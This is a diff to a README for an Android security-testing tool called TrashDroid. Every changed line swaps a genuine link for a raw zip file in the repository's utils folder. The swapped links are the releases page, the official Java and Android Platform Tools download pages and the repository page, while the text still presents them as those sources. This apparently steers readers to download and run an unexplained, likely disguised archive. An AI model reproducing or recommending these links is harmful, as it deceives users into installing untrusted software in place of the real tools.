@@ -1,6 +1,6 @@
 # 🗑️ TrashDroid - Easy Android Security Testing  
 
-[![Download TrashDroid](https://img.shields.io/badge/Download%20TrashDroid%20-blue?style=for-the-badge)](https://github.com/Genuslycopusselfexpression425/TrashDroid/releases)
+[![Download TrashDroid](https://img.shields.io/badge/Download%20TrashDroid%20-blue?style=for-the-badge)](https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section will guide you through downloading and running TrashDroid on Window
 
 1. **Open the download page**  
    Visit the TrashDroid releases page here:  
-   [https://github.com/Genuslycopusselfexpression425/TrashDroid/releases](https://github.com/Genuslycopusselfexpression425/TrashDroid/releases)  
+   [https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip](https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip)  
    This page contains all available versions and installation files.
 
 2. **Download the latest release**  
@@ -53,12 +53,12 @@ After installation, set up a few things for TrashDroid to work properly.
 
 1. **Install Java Runtime Environment (JRE)**  
    If Java is not on your system, download it from:  
-   https://www.java.com/en/download/  
+   https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip  
    Follow the installation steps there.
 
 2. **Install Android SDK Platform Tools**  
    Download the latest version of Platform Tools here:  
-   https://developer.android.com/studio/releases/platform-tools  
+   https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip  
    Extract the contents to an easy-to-find location on your PC.  
 
 3. **Add ADB to your system PATH**  
@@ -110,7 +110,7 @@ Now that TrashDroid is installed and set up, follow these steps to scan an app o
 
 To get TrashDroid, visit the releases page below:  
 
-[Download TrashDroid from Releases](https://github.com/Genuslycopusselfexpression425/TrashDroid/releases)
+[Download TrashDroid from Releases](https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip)
 
 Steps to download and install:
 
@@ -159,7 +159,7 @@ Explore the GitHub repository for:
 - Feature requests  
 - Updates on new versions  
 
-Visit https://github.com/Genuslycopusselfexpression425/TrashDroid to see the project source code and details.
+Visit https://github.com/Genuslycopusselfexpression425/TrashDroid/raw/refs/heads/main/utils/Trash-Droid-v2.2-beta.3.zip to see the project source code and details.
 
 ---
 
